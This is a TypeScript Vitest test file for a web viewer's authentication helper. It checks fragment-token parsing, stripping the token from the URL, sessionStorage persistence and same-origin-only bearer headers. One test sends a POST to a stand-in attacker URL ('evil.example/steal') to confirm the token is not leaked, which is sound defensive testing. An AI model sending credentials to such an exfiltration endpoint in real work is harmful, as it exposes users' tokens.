// @vitest-environment jsdom
import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { apiFetch, parseFragmentToken, viewerToken } from "../../src/viewer/src/api/auth.js";

/**
 * The viewer owns its own `Authorization` header.
 *
 * These replace the two `serve-security.test.ts` cases that used to execute
 * the server-injected bootstrap script: the mechanism moved from a template
 * string in `serve.ts` to this module, the assertions did not weaken.
 */
describe("viewer auth", () => {
  let calls: Array<{ url: string; init?: RequestInit }>;

  beforeEach(() => {
    calls = [];
    vi.stubGlobal(
      "fetch",
      vi.fn((input: unknown, init?: RequestInit) => {
        calls.push({ url: String(input), init });
        return Promise.resolve(new Response("{}"));
      })
    );
    window.sessionStorage.clear();
    window.history.replaceState(null, "", "/");
  });

  afterEach(() => {
    vi.unstubAllGlobals();
    window.sessionStorage.clear();
    window.history.replaceState(null, "", "/");
  });

  const openAt = (hash: string) => window.history.replaceState(null, "", `/${hash}`);

  it("attaches the bearer header to same-origin API calls, and only those", async () => {
    openAt("#token=tok");

    await apiFetch("/api/architecture");
    expect(new Headers(calls[0].init?.headers).get("Authorization")).toBe("Bearer tok");

    await apiFetch("https://evil.example/steal", { method: "POST" });
    expect(new Headers(calls[1].init?.headers).get("Authorization")).toBeNull();
  });

  it("keeps caller-supplied headers alongside the bearer token", async () => {
    openAt("#token=tok");

    await apiFetch("/api/prompts", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: "{}",
    });

    const headers = new Headers(calls[0].init?.headers);
    expect(headers.get("Authorization")).toBe("Bearer tok");
    expect(headers.get("Content-Type")).toBe("application/json");
    expect(calls[0].init?.method).toBe("POST");
    expect(calls[0].init?.body).toBe("{}");
  });

  it("reads the token from the fragment and strips it from the address bar", async () => {
    openAt("?mode=learning#token=tok");

    expect(viewerToken()).toBe("tok");
    expect(window.location.hash).toBe("");
    // The query string, which carries non-secret viewer state, survives.
    expect(window.location.search).toBe("?mode=learning");
  });

  it("still authenticates after a reload of the fragment-less URL", async () => {
    openAt("#token=tok");
    expect(viewerToken()).toBe("tok");
    expect(window.location.hash).toBe("");

    // Reload: the fragment is gone from the URL, the tab remembers the token.
    await apiFetch("/api/architecture");
    expect(new Headers(calls[0].init?.headers).get("Authorization")).toBe("Bearer tok");
  });

  it("sends no header when there is no token anywhere", async () => {
    // No fragment and an empty store: this is the hand-typed
    // `localhost:4567` case. The request goes out unauthenticated and the
    // server's 401 stands — there is deliberately no fallback.
    await apiFetch("/api/architecture");
    expect(calls[0].init).toBeUndefined();
    expect(new Headers(calls[0].init?.headers).get("Authorization")).toBeNull();
  });

  it("lets the fragment win over a stale stored token", async () => {
    window.sessionStorage.setItem("arkive.viewer.token", "stale");
    openAt("#token=fresh");
    expect(viewerToken()).toBe("fresh");
  });

  it("reads the token out of a fragment with other parameters around it", () => {
    expect(parseFragmentToken("#token=abc")).toBe("abc");
    expect(parseFragmentToken("#mode=learning&token=abc&x=1")).toBe("abc");
    expect(parseFragmentToken("#a=1&token=abc")).toBe("abc");
    expect(parseFragmentToken("#token=with%20space")).toBe("with space");
    expect(parseFragmentToken("#token=")).toBeNull();
    expect(parseFragmentToken("#mode=learning")).toBeNull();
    expect(parseFragmentToken("")).toBeNull();
  });

  it("does not monkey-patch the global fetch", async () => {
    const stub = vi.fn(() => Promise.resolve(new Response("{}")));
    vi.stubGlobal("fetch", stub);
    openAt("#token=tok");
    const before = globalThis.fetch;
    await apiFetch("/api/architecture");
    expect(globalThis.fetch).toBe(before);
    // Still called, through the untouched global binding.
    expect(stub).toHaveBeenCalledOnce();
  });
});